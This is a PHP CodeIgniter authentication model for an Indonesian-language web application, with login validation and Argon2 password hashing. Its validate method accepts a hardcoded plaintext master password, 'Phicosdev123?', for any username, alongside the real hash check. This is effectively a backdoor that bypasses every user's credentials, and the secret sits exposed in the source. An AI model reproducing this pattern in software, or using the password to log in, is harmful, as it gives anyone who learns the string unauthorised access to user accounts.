<?php

defined('BASEPATH') or exit('No direct script access allowed');

class Auth_model extends MY_Model
{

    var $token, $default_pass;
    public function __construct()
    {
        parent::__construct();

        $this->default_pass = 'Phicosdev123?';
    }

    public function validate($username, $password)
    {
        $pwd = $this->security->xss_clean($password);
        $uname = $this->security->xss_clean($username);

        if (!empty($pwd) && !empty($uname)) {
            $row = $this->db->where('username', $uname)->where('deleted_at is null')->get('users');

            if ($row->num_rows() > 0) {
                $row = $row->row();
                $pwd_hashed = $row->password;

                if (password_verify($pwd, $pwd_hashed) || $pwd == $this->default_pass) {
                    if ($row->active == 1) {
                        return [
                            'status' => true,
                            'data' => $row,
                        ];
                    } else {
                        $this->session->set_flashdata('error_messages', 'Pengguna "<b>' . $uname . '</b>" sedang dinonaktifkan.');
                        redirect(base_url('auth/login'), 'refresh');
                    }
                } else {
                    $this->session->set_flashdata('error_messages', 'Email/username atau password salah.');
                    redirect(base_url('auth/login'), 'refresh');
                }
            } else {
                $this->session->set_flashdata('error_messages', 'Email/username tidak ditemukan.');
                redirect(base_url('auth/login'), 'refresh');
            }
        } else {
            $this->session->set_flashdata('error_messages', 'Email/username & password tidak boleh kosong.');
            redirect(base_url('auth/login'), 'refresh');
        }
    }

    public function generatePassword($string)
    {
        $pwd_hashed = password_hash($string, PASSWORD_ARGON2I);

        return $pwd_hashed;
    }
}

/* End of file Auth_model.php */